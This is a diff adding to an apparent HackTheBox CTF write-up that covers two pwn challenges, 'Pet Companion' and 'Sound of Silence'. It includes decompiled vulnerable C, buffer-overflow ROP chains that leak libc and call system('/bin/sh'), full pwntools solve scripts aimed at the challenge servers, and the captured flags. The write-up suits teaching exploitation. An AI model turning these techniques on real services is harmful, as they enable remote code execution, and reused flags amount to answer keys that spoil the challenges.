@@ -777,27 +777,143 @@ p.interactive()
 
 </details>
 
+> Flag : HTB{b00m_b00m_r0ck3t_2_th3_m00n}
+
 ## Pwn/Pet Companion
 
 <details>
 <summary>Decompiled Code</summary>
 
 ```c
+undefined8 main(void)
 
+{
+  undefined8 local_48;
+  undefined8 local_40;
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined8 local_28;
+  undefined8 local_20;
+  undefined8 local_18;
+  undefined8 local_10;
+  
+  setup();
+  local_48 = 0;
+  local_40 = 0;
+  local_38 = 0;
+  local_30 = 0;
+  local_28 = 0;
+  local_20 = 0;
+  local_18 = 0;
+  local_10 = 0;
+  write(1,"\n[!] Set your pet companion\'s current status: ",0x2e);
+  read(0,&local_48,0x100);
+  write(1,"\n[*] Configuring...\n\n",0x15);
+  return 0;
+}
 ```
 
 </details>
 
+Looking at the code, theres not much going on other than a BOF. Theres no win function so we'd probabably have to spawn a shell.
 
+![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/bec28aa0-b583-4ce1-b100-8d679344a4d2)
+
+Looking at the functions imported into the binary from libc, theres only read() and write(). So our attack plan will be to call write() and pass it the address of write in the GOT to get a leak. Looking at the ROP gadgets available, we have what we need to be able to do this.
+
+```python
+payload = b"A" * offset
+payload += p64(pop_rdi)
+payload += p64(1)
+payload += p64(pop_rsi_r15)
+payload += p64(write_got)
+payload += p64(0xdeadbeef)
+payload += p64(write_plt)
+payload += p64(pop_rdi+1)
+payload += p64(main_sym)
+```
+
+In the first stage of our payload, we need to leak libc
+
+```python
+payload = b"A" * offset
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(pop_rdi+1)
+payload += p64(libc_system)
+```
+
+Then on the second stage, we will just execute a ret2system.
 
 <details>
 <summary>Solve Script</summary>
 
 ```python
+#!/usr/bin/python
+from pwn import *
+import warnings
+import time
 
+warnings.filterwarnings("ignore",category=BytesWarning)
+
+exe = context.binary = ELF('./pet_companion')
+libc = exe.libc
+
+host = "83.136.249.230"
+port = 35817
+
+gdb_script = '''
+
+'''
+
+#p = exe.process()
+p = remote(host,port)
+#p = gdb.debug('./', gdbscript = gdb_script)
+
+pop_rdi = 0x0000000000400743 #: pop rdi ; ret
+pop_rsi_r15 = 0x0000000000400741 #: pop rsi ; pop r15 ; ret
+
+main_sym = exe.sym["main"]
+write_got = exe.got["write"]
+write_plt = exe.plt["write"]
+offset = 0x48
+
+payload = b"A" * offset
+payload += p64(pop_rdi)
+payload += p64(1)
+payload += p64(pop_rsi_r15)
+payload += p64(write_got)
+payload += p64(0xdeadbeef)
+payload += p64(write_plt)
+payload += p64(pop_rdi+1)
+payload += p64(main_sym)
+
+p.sendlineafter(b"status: ", payload)
+p.recvline()
+p.recvline()
+p.recvline()
+leak = u64(p.recv(8))
+
+libc.address = leak - (0x7f2ec85100f0 - 0x7f2ec8400000)
+print("Libc : ", hex(libc.address))
+
+binsh = next(libc.search(b"/bin/sh\x00"))
+libc_system = libc.sym["system"]
+
+payload = b"A" * offset
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(pop_rdi+1)
+payload += p64(libc_system)
+
+p.sendlineafter(b"status: ", payload)
+
+p.interactive() 
 ```
 
 </details>
+
+> Flag : HTB{c0nf1gur3_w3r_d0g}
 
 ## Pwn/Sound of Silence
 
@@ -805,18 +921,79 @@ p.interactive()
 <summary>Decompiled Code</summary>
 
 ```c
+void main(void)
 
+{
+  char local_28 [32];
+  
+  system("clear && echo -n \'~The Sound of Silence is mesmerising~\n\n>> \'");
+  gets(local_28);
+  return;
+}
 ```
 
 </details>
 
+Looking at the code, its very similar to the previous challenge. 
 
+![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/efcd95ab-bc54-4ac7-b892-889dd22d3fd4)
+
+The only difference is that only gets() and system() are imported into the binary. Somehow we have to spawn a shell with only gets(). This is possible because when you finish calling gets(), the pointer to the string you input is still in the rdi. So, if you call system() immediately after gets(), the argument passed to system() will be what you input into gets().
+
+```python
+payload = b"A" * offset
+payload += p64(gets_sym)
+payload += p64(system_sym)
+```
+
+With the payload above, just send "/bin/sh" after that and you will spawn a shell.
+
+![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/48c6ab8d-4e79-4e9d-bcbc-aba7f92ee3f8)
+
+"/bin.sh" not found?
+
+We need to change our payload to "/bin0sh". A wise man once told me that
+
+![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/4cb46843-e97f-4da6-8b2d-d9e1387d9dd1)
 
 <details>
 <summary>Solve Script</summary>
 
 ```python
+#!/usr/bin/python
+from pwn import *
+import warnings
 
+warnings.filterwarnings("ignore",category=BytesWarning)
+
+exe = context.binary = ELF('./sound_of_silence')
+
+host = "94.237.60.170"
+port = 44642
+
+gdb_script = '''
+
+'''
+
+#p = exe.process()
+p = remote(host,port)
+#p = gdb.debug('./', gdbscript = gdb_script)
+
+offset = 0x28
+
+gets_sym = exe.sym["gets"]
+system_sym = exe.sym["system"]
+
+payload = b"A" * offset
+payload += p64(gets_sym)
+payload += p64(system_sym)
+
+p.sendlineafter(b">> ", payload)
+p.sendline(b"/bin0sh\x00")
+
+p.interactive()
 ```
+
+> Flag : HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}
 
 </details>
